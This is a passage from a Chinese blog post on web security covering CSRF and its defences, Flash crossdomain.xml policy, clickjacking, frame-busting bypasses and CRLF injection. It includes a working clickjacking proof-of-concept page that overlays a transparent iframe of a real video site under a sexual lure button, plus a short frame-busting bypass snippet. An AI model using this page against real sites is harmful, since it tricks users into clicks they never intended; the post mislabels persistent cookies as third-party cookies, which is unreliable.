<h3 id="攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session-Cookie”，又称为“临时Cookie”；另一种是”Third-party-Cookie”-也成为“本地Cookie”。两者区别在于，Third-party-Cookie-是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part-Cookie。"><a href="#攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session-Cookie”，又称为“临时Cookie”；另一种是”Third-party-Cookie”-也成为“本地Cookie”。两者区别在于，Third-party-Cookie-是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part-Cookie。" class="headerlink" title="攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称为“临时Cookie”；另一种是”Third-party Cookie”,也成为“本地Cookie”。两者区别在于，Third-party Cookie 是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part Cookie。"></a>攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称为“临时Cookie”；另一种是”Third-party Cookie”,也成为“本地Cookie”。两者区别在于，Third-party Cookie 是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part Cookie。</h3><p>###攻击方式：如果浏览器没有限制Third-part　Ｃookie 的在其他域的情况下进行发送就会引起csrf的风险。(主流浏览器都无法阻止在用img等标签跨域加载资源时候发送cookie，因为其视之是正常行为)<br>注意：P3P头部的设置会使得原来会限制第三方cookie发送的IE浏览器也变得敞开大门。是的iframe、script等标签在IE中不再拦截第三方Cookie的发送。P3P头只需要由网站设置一次即可，之后每次请求都会遵循此策略，<br>而不需要再重复设置。</p>
<h3 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h3><ol>
<li><p>使用验证码<br>csrf攻击往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制攻击。<br><strong>缺点：用户体验不好，很多情况下不能够使用验证码方式。</strong></p>
</li>
<li><p>使用加盐token<br>由于弹出验证码的方式用户体验不佳，可以通过在页面嵌入一个隐藏的input，当页面从服务器返回的时候，就会把一个加密后的token存放在这个input中，当表单提交的时候就会把这个隐藏的token一起发送出去。因为这个token<br>是通过加盐加密的而客户端是没有这个盐的，所以这样可以验证请求是否来源正确。<br><strong>缺点：当结合xss和csrf的时候，能够通过xss获取隐藏的input中的token再进行csrf攻击。还可以通过使用flash的方式去获取token然后再进行csrf攻击</strong></p>
</li>
<li><p>对flash进行限制<br>flash在跨域时唯一的限制策略就是crossdomain.xml文件，该文件限制了flash是否可以跨域读写数据以及允许从什么地方跨域读写数据。</p>
</li>
</ol>
<p>位于www.a.com域中的SWF文件要访问www.b.com的文件时，SWF首先会检查www.b.com服务器目录下是否有crossdomain.xml文件，如果没有，则访问不成功；若crossdomain.xml文件存在，且里边设置了允许www.a.com域访问，那么通信正常。所以要使Flash可以跨域传输数据，其关键就是crossdomain.xml。</p>
<p>自flash 10以后，如有跨域访问需求，必须在目标域的根目录下放置crossdomain.xml文件，且该根目录下的配置文件称为“主策略文件”。若不存在主策略文件，则该域将禁止任何第三方域的flash跨域请求。</p>
<p>主策略文件对全站的跨域访问起控制作用。</p>
<p>也可以单独在某路径下放置仅对该路径及其子路径生效的crossdomain.xml配置文件，这需要在flash的AS脚本中使用如下语句来加载该配置文件：[具体的加载权限限制，将受后文中site-control策略的影响]</p>
<p>crossdomain.xml需严格遵守XML语法，有且仅有一个根节点cross-domain-policy，且不包含任何属性。在此根节点下只能包含如下的子节点：site-control、allow-access-from、allow-access-from-identity、allow-http-request-headers-from。下面将分别介绍这四个子节点：<br>2.2.1site-control：通过检查该节点的属性值，确认是否可以允许加载其他策略文件。[如果该策略文件并非主策略文件，则此节点被自动忽略]</p>
<p>每个site-control标签有且仅有属性permitted-cross-domain-policies，该属性指定相对于非主策略文件的其他策略文件的加载策略。permitted-cross-domain-policies属性值有如下情况：</p>
<p>none: 不允许使用loadPolicyFile方法加载任何策略文件，包括此主策略文件。</p>
<p>master-only: 只允许使用主策略文件[默认值]。</p>
<p>by-content-type:只允许使用loadPolicyFile方法加载HTTP/HTTPS协议下Content-Type 为text/x-cross-domain-policy的文件作为跨域策略文件。</p>
<p>by-ftp-filename:只允许使用loadPolicyFile方法加载FTP协议下文件名为       crossdomain.xml的文件作为跨域策略文件。</p>
<p>all: 可使用loadPolicyFile方法加载目标域上的任何文件作为跨域策略文件，甚至是一 个JPG也可被加载为策略文件！[使用此选项那就等着被xx吧！]</p>
<p>llow-access-from：通过检查该节点的属性值，确认能够读取本域内容的flash文件来源域。</p>
<p>allow-access-from标签有三个属性：</p>
<p>·domain：该属性指定一个确切的 IP 地址、一个确切的域或一个通配符域（任何域）。只有domain中指定的域，才有权限通过flash读取本域中的内容。</p>
<p>可采用下列两种方式之一来表示通配符域：</p>
<p>1）单个星号（<em>），如：&lt;allow-access-fromdomain=”</em>“ /&gt;，表示匹配所有域和所有IP 地     址，此时任何域均可跨域访问本域上的内容。[这是极不安全的！]</p>
<p>2）后接后缀的星号，表示只匹配那些以指定后缀结尾的域，如<em>.qq.com可匹配            game.qq.com、qq.com。形如www.q</em>.com或www.qq.*的为无效配置。</p>
<p>Tips：当domain被指定为IP地址时，只接受使用该IP作为网址来访问的来源请求[此时ip地址也就相当于一个域名而已]，如domain被设置为192.168.1.100时，使用<a href="http://192.168.1.100/flash.swf" target="_blank" rel="external">http://192.168.1.100/flash.swf</a> 来请求该域内容是允许的，但是使用指向192.168.1.100的域名www.a.com来访问时[<a href="http://www.a.com/flash.swf]将会被拒绝，因为flash不懂得dns解析：）" target="_blank" rel="external">http://www.a.com/flash.swf]将会被拒绝，因为flash不懂得dns解析：）</a></p>
<p>·to-ports：该属性值表明允许访问读取本域内容的socket连接端口范围。可使用to-ports=”1100,1120-1125”这样的形式来限定端口范围，也可使用通配符（*）表示允许所有端口。</p>
<p>·secure：该属性值指明信息是否经加密传输。当crossdomain.xml文件使用https加载时，secure默认设为true。此时将不允许flash传输非https加密内容。若手工设置为false则允许flash传输非https加密内容。</p>
<p>下面的例子配置为允许所有qq.com下的所有二级域名[包括qq.com本身]通过https访问本域中的内容。 </p>
<p>allow-http-request-headers-from：此节点授权第三方域flash向本域发送用户定义的http头。</p>
<p>allow-access-from节点授权第三域提取本域中的数据，而 allow-http-request-headers-from 节点授权第三方域将数据以http头的形式发送到本域中。[简而言之，allow-access-from是控制读取权限，allow-http-request-headers-from是控制以http头形式的写入权限]</p>
<p>allow-http-request-headers-from包含三个属性：</p>
<p>·domain：作用及参数格式与allow-access-from节点中的domain类似。</p>
<p>·headers：以逗号隔开的列表，表明允许发送的http头。可用通配符（*）表示全部    http头。</p>
<p>·secure：作用及用法与allow-access-from节点中的secure相同。</p>
<ol>
<li>使用jwt(jsonwebtoken)<br>既然是因为浏览器在发往同域名请求的时候自动带上了cookie从而进行了攻击，那么只要限制这个行为即可。把发送<br>身份验证信息的行为交给程序员管理，通过把token存放在localstorage然后用请求头的方式发送，是的攻击者无法获取到token。</li>
</ol>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><blockquote>
<p>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe。覆盖在一个网页上，然后时用户在该网页上进行操作。此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以有使用户恰好点击在iframe页面的一些功能性按钮上。<br><em>实战代码</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;点击劫持 POC&lt;/title&gt;</div><div class="line">&lt;style&gt;</div><div class="line">iframe &#123;</div><div class="line">width: 1440px;</div><div class="line">height: 900px;</div><div class="line">position: absolute;</div><div class="line">top: -0px;</div><div class="line">left: -0px;</div><div class="line">z-index: 2;</div><div class="line">-moz-opacity: 0;</div><div class="line">opacity: 0;</div><div class="line">filter: alpha(opacity=0);</div><div class="line">&#125;</div><div class="line">button &#123;</div><div class="line">position: absolute;</div><div class="line">top: 230px;</div><div class="line">left: 1200px;</div><div class="line">z-index: 1;</div><div class="line">width: 80px;</div><div class="line">height:20px;</div><div class="line">&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;button&gt;点击脱衣&lt;/button&gt;</div><div class="line">&lt;img src=&quot;http://b.hiphotos.baidu.com/image/pic/item/3ac79f3df8dcd1001341dbcd768b4710b8122f78.jpg&quot;&gt;</div><div class="line">&lt;iframe src=&quot;http://i.youku.com/u/UMjA0NTg4Njcy&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="flash点击劫持"><a href="#flash点击劫持" class="headerlink" title="flash点击劫持"></a>flash点击劫持</h3><p><strong>目前adobe公司已经在Flash中修补了此漏洞</strong></p>
<blockquote>
<p>首先、攻击者制作了一个Flash游戏。并诱惑用户来玩这个游戏这个游戏就是让用户去点击’click’按钮，每次点击这个按钮的位置都会发生变化。游戏通过设置一个不可看见的iframe使得用户会在无意中跟随着鼠标点击的位置，完成一些较为复杂的流程。</p>
</blockquote>
<h3 id="点击劫持的防御"><a href="#点击劫持的防御" class="headerlink" title="点击劫持的防御"></a>点击劫持的防御</h3><blockquote>
<p>因为clickjacking是一种视觉上的欺骗，那么如何防御它呢？针对传统clickjacking，一般是通过禁止跨域的iframe来进行防范。</p>
<h4 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h4><p>通过写一段JavaScript代码，禁止iframe的嵌套。这种方法叫frame busting。<br>   <code>if(top.location != location) {
        top.location = self.location
    }</code><br>常见的frame busting 有以下这些方式:<br>   <code>if(top != self)
    if(top.location != location)
    if(top.locaiton != self.location)</code><br>但是通过以下方式能够绕过上面的保护代码：<br>    <code>Attacker top frame:
        &lt;iframe src=&quot;attacker2.html&quot;&gt;
        Attacker sub-frame:
        &lt;iframe src=&quot;http://www.victim.com&quot;&gt;</code><br>此外，像HTML5中iframe的sandbox属性，IE中iframe的security属性等，都可以限制iframe页面的<br>JavaScript脚本执行。从而使得frame busting 失效</p>
</blockquote>
<h4 id="x-frame-option"><a href="#x-frame-option" class="headerlink" title="x-frame-option"></a>x-frame-option</h4><p>使用http头部x-frame-options，这个头部可以设置为三个可选的值：</p>
<ol>
<li>deny</li>
<li>sameorigin</li>
<li>allow-from origin<br>当设置为deny时候，浏览器会拒绝当前页面加载任何frame页面；<br>除了X-frame-options之外，firefox的’CSP’以及firefox的No-script扩展也能够有效防御clickJacking。</li>
</ol>
<h3 id="CRLF注入攻击"><a href="#CRLF注入攻击" class="headerlink" title="CRLF注入攻击"></a>CRLF注入攻击</h3><blockquote>
<p>CRLF实际上是两个字符： CR是（ASCII 13 ‘\r’ ）,LF是（ASCII 10.\n）,这两个字符是用于表示换行的。CRLF常被用作不同语义之间的分隔符。因此通过’注入CRLF字符’，就有可能改变原有的语义<br><strong>CRLF不单只可以对服务器保存的日志进行攻击，最重要的是其可以对http头部进行攻击。</strong><br>在http协议中，http头是通过”\r\n”来进行分割的。因此如果服务器端没有过滤’\r\n’，而又把用户输入的数据放在http头中，则有可能导致安全隐患。<br>首先攻击方式可以对数据库系统的日志记录进行伪造，同时也可以通过对http头部进行切割完成XSS攻击。</p>
<h4 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h4><p>非常简单，只需要处理好”\r”,”\n”这两个保留字符即可，是说通过对其进行转义。</p>
</blockquote>

    

    
</div>


                

                <!-- Post Comments -->
                
                    




                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2017/03/16/如何实现lazyman/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            新篇
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2017/03/14/AMD模块加载理解/" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/myavatar.jpg" alt="kyjo2014's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        467346087@qq.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="#" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/" target="_self">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/09/">九月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/06/">六月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/05/">五月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/10/">十月 2016<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/07/">七月 2016<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/04/">四月 2016<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/03/">三月 2016<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/11/">十一月 2015<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/10/">十月 2015<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/09/">九月 2015<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/08/">八月 2015<span class="sidebar_archives-count">10</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    

    <!-- Pages  -->
    

    <!-- Article Number  -->
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->

    <div class="sidebar-divider"></div>


<!-- Theme Material -->

    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
            主题 - Material
            <span class="sidebar-badge badge-circle">i</span>
        </div>
    </a>


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
        <a href="https://twitter.com/twitter" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-twitter.png);">
                <span class="visuallyhidden">Twitter</span>
            </button><!--
     --></a>
    

    <!-- Facebook -->
    
        <a href="https://www.facebook.com/facebook" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-facebook.png);">
                <span class="visuallyhidden">Facebook</span>
            </button><!--
     --></a>
    

    <!-- Google + -->
    
        <a href="https://www.google.com/" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-gplus.png);">
                <span class="visuallyhidden">Google Plus</span>
            </button><!--
     --></a>
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    
        <a href="bestkyjo" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-github.png);">
                <span class="visuallyhidden">Github</span>
            </button><!--
     --></a>
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©&nbsp;
            <script type="text/javascript">
                var fd = new Date();
                document.write(fd.getFullYear());
            </script>
            &nbsp;LTH's note book
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>


                    <!-- Import File -->
<script src="/js/lazyload.min.js"></script>
<script src="/js/js.min.js"></script>
<script src="/js/nprogress.js"></script>

<script type="text/javascript">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>













<!-- Swiftye -->


<!-- Local Search-->


<!-- Window Load-->
<script>
    $(window).load(function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });
</script>

<!-- MathJax Load-->


                </main>
            </div>
        </body>
    
</html>
